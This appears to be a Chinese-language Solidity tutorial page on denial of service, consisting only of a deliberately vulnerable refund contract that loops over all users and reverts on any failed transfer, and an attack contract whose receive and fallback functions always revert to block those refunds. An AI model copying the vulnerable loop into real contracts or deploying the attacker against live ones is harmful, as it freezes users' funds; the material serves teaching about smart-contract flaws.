# 拒绝服务

<DocsAD/>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Dos {
    mapping(address => uint256) private  balanceOf;
    address[] private users;
    
    function deposit() external payable {
        balanceOf[msg.sender] = msg.value;
        users.push(msg.sender);
    }

    function refund() external {
        uint256 usersLen = users.length;
        for(uint256 i; i < usersLen; i++){
            address user = users[i];
            uint256 refundETH = balanceOf[user];
            (bool success, ) = user.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[user] = 0;
        }
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    receive() external payable{
        revert("DoS Attack!");
    }

    fallback()  external payable{
        revert("DoS Attack!");
    }

    function attack(address gameAddr) external payable {
        Dos dos = Dos(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
```